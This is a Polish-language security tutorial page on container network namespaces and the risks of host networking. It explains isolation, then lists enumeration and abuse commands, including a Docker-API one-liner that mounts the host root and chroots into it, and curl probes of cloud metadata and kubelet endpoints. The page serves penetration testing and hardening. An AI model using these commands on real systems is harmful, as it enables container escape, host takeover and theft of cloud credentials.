# Namespace sieciowy

{{#include ../../../../../banners/hacktricks-training.md}}

## Przegląd

Network namespace izoluje zasoby związane z siecią, takie jak interfejsy, adresy IP, tablice routingu, stan ARP/neighbour, reguły firewalla, sockety, abstrakcyjną przestrzeń nazw socketów domeny UNIX oraz zawartość plików takich jak `/proc/net`. Dzięki temu kontener może mieć coś, co wygląda jak jego własny `eth0`, własne trasy lokalne i własne urządzenie loopback, bez posiadania rzeczywistego stosu sieciowego hosta.

Z punktu widzenia bezpieczeństwa ma to znaczenie, ponieważ izolacja sieci obejmuje znacznie więcej niż samo bindowanie portów. Prywatny network namespace ogranicza to, co workload może bezpośrednio obserwować lub rekonfigurować. Gdy ten namespace jest współdzielony z hostem, kontener może nagle uzyskać widoczność listenerów hosta, usług lokalnych hosta, abstrakcyjnych endpointów AF_UNIX oraz punktów kontroli sieci, które nigdy nie miały być udostępniane aplikacji.

## Działanie

Nowo utworzony network namespace rozpoczyna z pustym lub niemal pustym środowiskiem sieciowym, dopóki nie zostaną do niego dołączone interfejsy. Następnie container runtimes tworzą lub podłączają wirtualne interfejsy, przypisują adresy i konfigurują trasy, aby workload miał oczekiwaną łączność. W deploymentach opartych na bridge zazwyczaj oznacza to, że kontener widzi interfejs oparty na veth, podłączony do bridge'a hosta. W Kubernetes wtyczki CNI wykonują analogiczną konfigurację na potrzeby sieci Podów.

Ta architektura wyjaśnia, dlaczego `--network=host` lub `hostNetwork: true` stanowi tak dużą zmianę. Zamiast otrzymać przygotowany prywatny stos sieciowy, workload dołącza do rzeczywistego stosu hosta.

## Lab

Możesz zobaczyć niemal pusty network namespace za pomocą:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Możesz również porównać zwykłe kontenery i kontenery korzystające z sieci hosta za pomocą:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Kontener korzystający z sieci hosta nie ma już własnego, odizolowanego widoku gniazd i interfejsów. Sama ta zmiana jest już istotna, zanim jeszcze zapytasz, jakie capabilities ma proces.

## Użycie w środowisku uruchomieniowym

Docker i Podman zwykle tworzą prywatny network namespace dla każdego kontenera, chyba że skonfigurowano je inaczej. Kubernetes zazwyczaj przydziela każdemu Podowi własny network namespace, współdzielony przez kontenery znajdujące się w tym Podzie, ale oddzielony od hosta. Oznacza to, że `127.0.0.1` zwykle odnosi się do całego Poda, a nie tylko do kontenera: listener nasłuchujący wyłącznie na localhost jest zazwyczaj osiągalny z jego sidecarów i kontenerów równorzędnych. Systemy Incus/LXC również zapewniają rozbudowaną izolację opartą na network namespace, często z większą różnorodnością konfiguracji wirtualnych sieci.

Wspólna zasada mówi, że prywatna sieć jest domyślną granicą izolacji, natomiast sieć hosta stanowi jawne zrezygnowanie z tej granicy.

## Błędne konfiguracje

Najważniejszą błędną konfiguracją jest po prostu współdzielenie network namespace hosta. Czasami robi się to ze względów wydajnościowych, na potrzeby monitorowania niskopoziomowego lub dla wygody, ale usuwa to jedną z najbardziej klarownych granic dostępnych w kontenerach. Listenery lokalne dla hosta stają się osiągalne w bardziej bezpośredni sposób, usługi dostępne wyłącznie przez localhost mogą stać się dostępne, a capabilities takie jak `CAP_NET_ADMIN` lub `CAP_NET_RAW` stają się znacznie bardziej niebezpieczne, ponieważ operacje, które umożliwiają, są teraz wykonywane w środowisku sieciowym samego hosta.

Innym problemem jest przyznawanie nadmiernych uprawnień związanych z siecią, nawet gdy network namespace jest prywatny. Prywatny namespace zapewnia pewną ochronę, ale nie sprawia, że raw sockets ani zaawansowana kontrola sieci stają się nieszkodliwe.

W Kubernetes `hostNetwork: true` zmienia również zakres zaufania, jakim można darzyć segmentację sieci na poziomie Poda. Kubernetes informuje, że wiele network plugins nie potrafi prawidłowo rozróżniać ruchu Podów `hostNetwork` podczas dopasowywania `podSelector` / `namespaceSelector`, dlatego traktuje go jak zwykły ruch węzła. Z punktu widzenia attackera oznacza to, że przejęty workload `hostNetwork` powinien często być traktowany jako foothold sieciowy na poziomie węzła, a nie jak zwykły Pod nadal ograniczony tymi samymi założeniami dotyczącymi polityk co workloady korzystające z overlay network.

## Nadużycia

W słabo izolowanych konfiguracjach attackerzy mogą sprawdzać usługi nasłuchujące na hoście, uzyskiwać dostęp do endpointów zarządzania powiązanych wyłącznie z loopbackiem, podsłuchiwać ruch lub ingerować w niego — zależnie od dokładnych capabilities i środowiska — albo rekonfigurować routing i stan firewalla, jeśli obecne jest `CAP_NET_ADMIN`. W klastrze może to również ułatwiać lateral movement i rekonesans control plane.

Jeśli podejrzewasz korzystanie z sieci hosta, zacznij od potwierdzenia, że widoczne interfejsy i listenery należą do hosta, a nie do odizolowanej sieci kontenera:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Usługi dostępne wyłącznie przez interfejs loopback są często pierwszym interesującym odkryciem:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstrakcyjne sockety UNIX to kolejny łatwy do przeoczenia cel, ponieważ są ograniczone do przestrzeni nazw sieci, mimo że nie wyglądają jak listenery TCP/UDP i mogą nie istnieć jako ścieżki w systemie plików pod `/run`. Kontener korzystający z sieci hosta może więc odziedziczyć dostęp do przeznaczonych wyłącznie dla hosta kanałów sterowania, które nigdy nie zostały do niego zamontowane przez bind mount:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Historycznym przykładem był błąd związany z ujawnieniem abstrakcyjnego gniazda `containerd-shim`, ale szerszy wniosek jest ważniejszy niż konkretny CVE: gdy workload dołącza do przestrzeni nazw sieci hosta, abstrakcyjne usługi AF_UNIX również stają się częścią powierzchni ataku. Jeśli te gniazda wyglądają na powiązane z runtime’em lub administracją, przejdź do [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Jeśli obecne są capabilities sieciowe, sprawdź, czy workload może przeglądać lub modyfikować widoczny stos sieciowy:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
W nowoczesnych kernelach host networking wraz z `CAP_NET_ADMIN` może również ujawniać ścieżkę pakietów poza proste zmiany w `iptables` / `nftables`. `tc` qdiscs i filters są również ograniczone do namespace, więc we współdzielonym host network namespace mają zastosowanie do interfejsów hosta, które kontener może zobaczyć. Jeśli dodatkowo obecne jest `CAP_BPF`, istotne stają się również związane z siecią programy eBPF, takie jak loadery TC i XDP:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Ma to znaczenie, ponieważ attacker może mirrorować, przekierowywać, kształtować lub odrzucać ruch na poziomie interfejsu hosta, a nie tylko przepisywać reguły firewalla. W prywatnej network namespace działania te są ograniczone do widoku kontenera; we współdzielonej host namespace zaczynają oddziaływać na hosta.

W środowiskach klastrowych lub chmurowych host networking uzasadnia również szybki lokalny recon metadanych i usług znajdujących się w pobliżu control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
W Kubernetes pamiętaj, że przejęcie **dowolnego** kontenera w Podzie składającym się z wielu kontenerów zapewnia również dostęp do listenerów localhost otwartych przez kontenery sąsiednie i sidecary, ponieważ cały Pod współdzieli jedną przestrzeń nazw sieci. Ma to szczególne znaczenie w przypadku service-mesh, obserwowalności i kontenerów pomocniczych, których interfejsy administracyjne lub debugowania są celowo dostępne wyłącznie wewnątrz Poda, a nie w całym klastrze:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Traktuj „bound to localhost” jako **prywatne dla Poda**, a nie **prywatne dla kontenera**. Po przejęciu jednego kontenera w Podzie to założenie przestaje obowiązywać.

### Pełny przykład: Host Networking + dostęp do lokalnego runtime / Kubelet

Host networking nie zapewnia automatycznie uprawnień root na hoście, ale często ujawnia usługi, które są celowo dostępne wyłącznie z samego noda. Jeśli jedna z tych usług jest słabo zabezpieczona, host networking staje się bezpośrednią ścieżką eskalacji uprawnień.

Docker API na localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet na localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Wpływ:

- bezpośrednie przejęcie hosta, jeśli lokalne API runtime jest dostępne bez odpowiedniej ochrony
- rozpoznanie klastra lub ruch boczny, jeśli kubelet albo lokalne agenty są osiągalne
- manipulowanie ruchem lub odmowa usługi w połączeniu z `CAP_NET_ADMIN`

## Kontrole

Celem tych kontroli jest ustalenie, czy proces ma prywatny stos sieciowy, jakie trasy i nasłuchujące usługi są widoczne oraz czy widok sieci już przypomina środowisko hosta, zanim w ogóle przetestujesz capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Co jest tutaj interesujące:

- Jeśli `/proc/self/ns/net` i `/proc/1/ns/net` już wyglądają jak przestrzeń nazw hosta, kontener może współdzielić przestrzeń nazw sieci hosta lub inną nieprywatną przestrzeń nazw.
- `lsns -t net` i `ip netns identify` są przydatne, gdy powłoka znajduje się już wewnątrz nazwanej lub trwałej przestrzeni nazw i chcesz skorelować ją z obiektami `/run/netns` po stronie hosta.
- `ss -lntup` jest szczególnie wartościowe, ponieważ ujawnia listenery dostępne wyłącznie przez loopback oraz lokalne endpointy zarządzania. `ss -xap` i `/proc/net/unix` uzupełniają obraz o widok abstract socketów, których zwykłe wyszukiwanie socketów w systemie plików nie wykrywa.
- Trasy, nazwy interfejsów, kontekst firewalla, stan `tc` oraz podpięcia eBPF stają się znacznie ważniejsze, jeśli dostępne są `CAP_NET_ADMIN`, `CAP_NET_RAW` lub `CAP_BPF`.
- W Kubernetes nieudane rozwiązywanie nazw usług z Poda `hostNetwork` może po prostu oznaczać, że Pod nie używa `dnsPolicy: ClusterFirstWithHostNet`, a nie że usługa nie istnieje.
- W Podach z wieloma kontenerami listenery localhost należą do całej przestrzeni nazw sieci Poda, dlatego przed założeniem, że port dostępny wyłącznie przez loopback jest nieosiągalny z przejętego kontenera, sprawdź sidecary i kontenery współdzielące Poda.

Podczas analizy kontenera zawsze oceniaj przestrzeń nazw sieci razem z zestawem capabilities. Host networking wraz z silnymi capabilities sieciowymi oznacza zupełnie inny poziom ryzyka niż bridge networking z ograniczonym domyślnym zestawem capabilities.

## Referencje

- [Zastrzeżenia dotyczące Kubernetes NetworkPolicy i `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [`network_namespaces(7)` w systemie Linux i izolacja abstract UNIX socketów](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [Porada containerd: abstract Unix domain sockets ujawnione kontenerom korzystającym z sieci hosta](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [Wymagania dotyczące tokenów eBPF i capabilities dla programów eBPF związanych z siecią](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
